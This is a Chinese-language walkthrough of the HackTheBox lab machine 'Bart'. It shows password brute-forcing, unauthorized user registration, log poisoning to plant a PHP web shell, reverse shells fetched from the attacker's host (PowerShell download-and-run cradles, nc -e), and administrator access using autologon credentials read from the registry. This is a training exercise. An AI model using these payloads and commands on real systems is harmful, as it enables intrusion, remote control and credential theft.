Bart是一个中等难度的靶机，知识点涉及密码爆破、网页信息爬取、javascript代码分析、登陆凭证获取、任意注册等。感兴趣的同学可以在HackTheBox中进行学习。

![截屏2021-10-21
上午2.38.50](https://image.3001.net/images/20220415/1649956025_625854b9ada6b81c592de.png!small)  
 _通关思维导图_  
![Bart](https://image.3001.net/images/20220415/1649956028_625854bc4692ef3fc36b0.png!small)

## 0x01 侦查

### 端口探测

首先通过nmap对目标进行端口扫描

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.81 -oA nmap_Bart
    

![截屏2021-10-21
上午2.52.33](https://image.3001.net/images/20220415/1649956030_625854be1d5b34a9a5ac7.png!small)  
扫描结果显示目标开放了80端口

#### 80端口

访问`http://10.10.10.81`会重定向至`http://forum.bart.htb`，因此需修改 hosts 文件通过用域名访问80端口

    
    
    vim /etc/hosts
    # HTB配置
    10.10.10.81 forum.bart.htb bart.htb
    

![截屏2021-10-21
上午3.15.06](https://image.3001.net/images/20220415/1649956033_625854c1624e60c10dcce.png!small)

使用 gobuster 进行目录扫描，但是扫描未成功

    
    
    gobuster dir -u http://forum.bart.htb -w /usr/share/wordlists/dirb/big.txt 
    

![截屏2021-10-21
上午3.52.35](https://image.3001.net/images/20220415/1649956038_625854c63b9d402367402.png!small)

切换 wfuzz 来测试目录结构，但是还是无果。

    
    
    wfuzz -c -w /usr/share/wordlists/dirb/big.txt http://forum.bart.htb/FUZZ --hh 158607
    

将目标切换为`http://bart.htb`进行扫描，扫描结果显示存在两个跳转目录：forum 和 monitor

    
    
    wfuzz -c -w /usr/share/wordlists/dirb/big.txt http://bart.htb/FUZZ 
    

![截屏2021-10-21
上午9.24.19](https://image.3001.net/images/20220415/1649956039_625854c77a9e7b6f846cd.png!small)  
![截屏2021-10-21
上午9.26.02](https://image.3001.net/images/20220415/1649956040_625854c8c553045946c8c.png!small)  
分别访问`http://bart.htb/forum`和`http://bart.htb/monitor`  
![截屏2021-10-21
上午10.02.32](https://image.3001.net/images/20220415/1649956042_625854ca1523e561acfa0.png!small)  
![截屏2021-10-21
上午10.03.29](https://image.3001.net/images/20220415/1649956045_625854cde1bd9a710800c.png!small)

forum 目录页面与 forum 子域名页面相同，那么 monitor 目录是否也与 monitor 子域名页面相同呢？带着这个疑问我们在 hosts
文件中添加域名解析

    
    
    vim /etc/hosts
    # HTB配置
    10.10.10.81 forum.bart.htb bart.htb monitor.bart.htb
    

成功访问，说明猜测正确  
![截屏2021-10-21
上午10.06.42](https://image.3001.net/images/20220415/1649956047_625854cf1ca5397979fe3.png!small)

### 密码爆破

在 forum.bart.htb 中存在以下用户信息。其中只有 Harvey Potter 的信息是被注释掉的，因此将其作为重点关注对象

Name| Email| Position  
---|---|---  
Samantha Brown| s.brown@bart.local| CEO@BART  
Daniel Simmons| d.simmons@bart.htb| Head of Sales  
Robert Hilton| r.hilton@bart.htb| Head of IT  
Harvey Potter| h.potter@bart.htb| Developer@BART  
Daniella Lamborghini| d.lamborghini@bart.htb (guess?)| Head of Recruitment  
  
![截屏2021-10-21
上午10.13.02](https://image.3001.net/images/20220415/1649956048_625854d05caa226a7df2d.png!small)

我们可以在监控登陆界面处的`找回密码`来进行用户名枚举。当输入错误的用户名时出现界面如下  
![截屏2021-10-21
上午10.22.40](https://image.3001.net/images/20220415/1649956051_625854d377656d52a2a6b.png!small)

当输入正确的用户名时，出现`email已发送`的提示信息  
![截屏2021-10-21
上午10.23.15](https://image.3001.net/images/20220415/1649956052_625854d45d9b543770a15.png!small)

使用 cewl 从网页上爬取字符来获取对应的字典

    
    
    cewl -w cewl-forum.txt -e -a http://forum.bart.htb
    

![截屏2021-10-21
上午10.32.00](https://image.3001.net/images/20220415/1649956053_625854d5774c2c6091d42.png!small)

使用 BurpSuite 对 harvey 用户进行密码爆破  
![截屏2021-10-21
下午2.25.34](https://image.3001.net/images/20220415/1649956054_625854d6961e6d75ac907.png!small)

将密码参数`user_password`作为请求变量，成功爆破出密码为 potter  
![截屏2021-10-21
下午2.25.15](https://image.3001.net/images/20220415/1649956055_625854d793a365db4ab52.png!small)

使用`harvey/potter`进行登录监控界面  
![截屏2021-10-21
下午2.35.58](https://image.3001.net/images/20220415/1649956056_625854d89c98873d432b3.png!small)

登陆后发现存在另一个子域名：`internal-01.bart.htb`  
![截屏2021-10-21
下午2.36.39](https://image.3001.net/images/20220415/1649956057_625854d983e9171eec4b4.png!small)

## 0x02 上线[iusr]

### 密码爆破

修改 hosts 文件并添加新的子域名

    
    
    10.10.10.81 forum.bart.htb bart.htb monitor.bart.htb internal-01.bart.htb
    

设置完成后访问`internal-01.bart.htb`，是一个内部聊天系统  
![截屏2021-10-21
下午2.38.57](https://image.3001.net/images/20220415/1649956058_625854da9c0f5c3fd079f.png!small)

尝试使用之前的账号密码进行登录，显示报错信息：密码长度不得小于8位  
![截屏2021-10-21
下午2.41.10](https://image.3001.net/images/20220415/1649956059_625854db8b41494ac2aed.png!small)

同时如果输入不存在的用户名则会提示用户名未认证  
![截屏2021-10-21
下午2.47.52](https://image.3001.net/images/20220415/1649956060_625854dc6472093886799.png!small)

尝试使用密码爆破的方式来获取密码，首先通过 BurpSuite 截取数据包  
![截屏2021-10-21
下午2.49.41](https://image.3001.net/images/20220415/1649956061_625854dd4a84a573b51c2.png!small)使用
hydra 进行构造对请求数据包进行爆破，但是返回的 code 都是302，无法识别是否为正确的 code

    
    
    hydra -t 1 -l harvey -P /usr/share/wordlists/fasttrack.txt  -o internal-out.txt -vV -f internal-01.bart.htb http-post-form '/simple_chat/login_form.php:uname=^USER^&passwd=^PASS^&submit=Login:error'
    

我们还是使用 BurpSuite 进行爆破  
![截屏2021-10-21
下午3.58.55](https://image.3001.net/images/20220415/1649956062_625854de260a06a3dea84.png!small)

成功拿到密码为`Password1`，使用`harvey/Password1`登录系统  
![截屏2021-10-21
下午3.01.29](https://image.3001.net/images/20220415/1649956063_625854df1003d0563faba.png!small)

### 任意注册

除了爆破以外我们还可以通过另外一种方式进行登录，扫描 simple_chat 目录可发现存在注册页面`register.php`

    
    
    gobuster dir -u http://internal-01.bart.htb/simple_chat -w /usr/share/wordlists/dirb/big.txt -x html,php,txt
    

虽然无法直接访问该文件。但是我们可通过以下命令注册一个新用户

    
    
    curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=mac&passwd=password"
    

以`mac/password`同样能够成功登录系统  
![截屏2021-10-21
下午3.40.42](https://image.3001.net/images/20220415/1649956064_625854e0131bca4400c22.png!small)

### js代码分析

查看页面源代码发现其中存在 javascript 代码

    
    
    function saveChat() {
    	// create a serialized object and send to log_chat.php. Once done hte XHR request, alert "Done"
    	var xhr = new XMLHttpRequest();
    	xhr.onreadystatechange = function() {
        	if (xhr.readyState == XMLHttpRequest.DONE) {
           		alert(xhr.responseText);
        	}
    	}
    	xhr.open('GET', 'http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey', true);
    	xhr.send(null);
    	alert("Done");
    }			
    

![截屏2021-10-21
下午3.08.46](https://image.3001.net/images/20220415/1649956065_625854e10dc5607c04efa.png!small)  
经过测试发现当用户点击 log 时，就会弹出`Done`并随后弹出数字1。因为变量 xhr 是由三个参数进行调用，当该参数为 true
时调用异步模式，脚本完成会提示`Done`。如果收到http响应时，则会调用`xhr.onreadystatechange`函数并进行提示。与此同时会将请求包直接记录到日志当中。

#### 日志记录获取webshell

访问`http://internal-01.bart.htb/log/log.txt`，发现它记录了用户请求时间、参数以及`user-agent`等请求信息  
![截屏2021-10-21
下午3.22.43](https://image.3001.net/images/20220415/1649956065_625854e1d7c2247b8bd2b.png!small)

与此同时我们再来看请求日志地址`http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey`，一个新的思路酝酿而成：如果指定请求参数
filename 为PHP文件并修改请求头 User-agent 为PHP脚本内容，是否能完成getshell？

使用 BurpSuite 截取点击log后的数据包，将请求参数 filename 修改为`phpinfo.php`，User-agent 修改为`<?php
phpinfo();?>`  
![截屏2021-10-21
下午4.03.35](https://image.3001.net/images/20220415/1649956066_625854e2dd4b2013cfcc2.png!small)

发送成功后访问`/log/phpinfo.php`，成功解析为php脚本语言，这也就意味着我们的猜测正确。  
![截屏2021-10-21
下午4.04.01](https://image.3001.net/images/20220415/1649956068_625854e411a8e5a965166.png!small)

尝试获取webshell，将文件名修改为`mac1.php`，内容为PHP一句话木马

    
    
    <?php system($_GET['cmd']);?>
    

![截屏2021-10-21
下午4.11.33](https://image.3001.net/images/20220415/1649956069_625854e556ee0269149a5.png!small)

访问木马地址`http://internal-01.bart.htb/log/mac1.php?cmd=whoami`，可成功执行命令  
![截屏2021-10-21
下午4.11.50](https://image.3001.net/images/20220415/1649956070_625854e64493a0b3aa1b1.png!small)

#### 反弹shell

使用 nishang 中的 Invoke-PowerShellTcp.ps1 脚本来构造反弹

    
    
    cp /root/Desktop/nishang/Shells/Invoke-PowerShellTcp.ps1 . 
    

在脚本最终添加需要反弹的地址和端口

    
    
    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 5555
    

使用 python 开启 http 服务

    
    
    python -m SimpleHTTPServer 80
    

在本地监听5555端口

    
    
    nc -nvlp 5555
    

在木马中执行如下命令

    
    
    cmd=powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.3/Invoke-PowerShellTcp.ps1')
    

成功反弹shell  
![截屏2021-10-21
下午4.17.27](https://image.3001.net/images/20220415/1649956071_625854e72afb156940b6c.png!small)

## 0x03 权限提升[administrator]

### 登陆凭证获取

 **参考文章：https://www.sploitspren.com/2018-01-26-Windows-Privilege-Escalation-Guide/**  
执行以下命令可在注册表中发现自动登录的默认凭据

    
    
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
    

但以上是cmd命令，而目前所处环境为powershell，因此需替换为powershell命令

    
    
    Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
    

![截屏2021-10-21
下午4.51.42](https://image.3001.net/images/20220415/1649956072_625854e86104c0aa99bf6.png!small)

但是结果显示为空，我们可再构造一个cmd的shell，首先上传 nc.exe

    
    
    powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/nc.exe','nc.exe')
    

![截屏2021-10-21
下午4.35.39](https://image.3001.net/images/20220415/1649956073_625854e990b2f2509ed2b.png!small)  
在本地监听7777端口

    
    
    nc -nvlp 7777
    

在靶机中执行反弹命令

    
    
    .\nc.exe -e cmd.exe 10.10.14.3 7777
    

成功拿到cmd窗口，同时查询操作系统版本发现目标为Windows 10 Pro  
![截屏2021-10-21
下午4.45.27](https://image.3001.net/images/20220415/1649956078_625854eee79cbe1e79f21.png!small)

但查询凭据后还是为空，说明并不是命令的问题。那到底是为什么找不到凭据呢？继续猜测可能是机器出了问题，但是后来发现并不是这样。真正原因是因为我们获取到的
shell 是32位的，而以上命令只能于64位 shell 中查询。  
![截屏2021-10-21
下午4.46.35](https://image.3001.net/images/20220415/1649956080_625854f0514f3c6bd58f3.png!small)

那么我们切换64位版本 nc 来反弹并上传 nc64.exe

    
    
    powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/nc64.exe','nc64.exe')
    

在本地监听2222端口

    
    
    nc -nvlp 2222
    

在靶机中执行反弹shell

    
    
    .\nc64.exe -e powershell.exe 10.10.14.3 2222
    

判断当前是否处于64位环境中

    
    
    [environment]::Is64BitOperatingSystem
    [environment]::Is64BitProcess
    

32位环境下：  
![截屏2021-10-22
上午9.23.14](https://image.3001.net/images/20220415/1649956081_625854f11c87f14696801.png!small)  
64位环境下：  
![截屏2021-10-22
上午9.24.35](https://image.3001.net/images/20220415/1649956082_625854f21ce1350ecdef9.png!small)  
查看注册表中的自动登录凭据  
![截屏2021-10-22
上午9.25.06](https://image.3001.net/images/20220415/1649956082_625854f2e0d6faadb1d26.png!small)

### 反弹shell

复制`Invoke-PowerShellTcp.ps1`为`shell.ps1`，同时将反弹端口修改为9999

    
    
    cp Invoke-PowerShellTcp.ps1 shell.ps1
    

在本地开启nc监听

    
    
    nc -nvlp 9999
    

构造管理员登陆凭据

    
    
    $username = "BART\Administrator"
    $password = "3130438f31186fbaf962f407711faddb"
    $secstr = New-Object -TypeName System.Security.SecureString
    $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
    $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
    Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/shell.ps1') } -Credential $cred -Computer localhost
    

![截屏2021-10-21
下午5.25.49](https://image.3001.net/images/20220415/1649956083_625854f3dbcf9fcbfde27.png!small)  
成功拿到反弹shell  
![截屏2021-10-21
下午5.26.02](https://image.3001.net/images/20220415/1649956084_625854f4de23f885211fa.png!small)  
分别在用户`h.potter`和管理员的桌面上寻找flag

    
    
    dir c:\Users\h.potter\
    type c:\Users\h.potter\user.txt
    dir c:\Users\administrator\Desktop
    type c:\Users\administrator\Desktop\root.txt
    

![截屏2021-10-21
下午5.29.23](https://image.3001.net/images/20220415/1649956085_625854f5c72ddf85d9ace.png!small)![截屏2021-10-21
下午5.30.28](https://image.3001.net/images/20220415/1649956086_625854f6e47b7a9b9844a.png!small)  
成功拿到两个flag

### 默认共享连接

当然我们也可以通过默认共享的方式连接在当前shell环境下拿到管理员权限

    
    
    net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb
    x:
    cd \Users\administrator\Desktop
    type root.txt
    

![截屏2021-10-21
下午6.26.52](https://image.3001.net/images/20220415/1649956087_625854f7e4983999f2b65.png!small)

**总结：**
该靶机主要考验我们的信息收集能力，直接访问站点会跳转至域名，因此我们我们需要通过域名解析才能成功访问站点。在目录扫描过程中发现存在monitor子域名，遂将其也添加至域名解析当中，monitor是一个监控管理界面，我们利用从主站点拿到的用户信息作为账号和cewl爬取的字符作为密码进行爆破，爆破成功后可使用harvey登陆监控系统，该系统中存在javascript代码，通过分析后我们可利用日志接口上传木马，并通过站点木马拿到反弹shell。靶机的注册表中存在管理员自动登陆凭证，借助该登陆凭证可成功上线管理员。

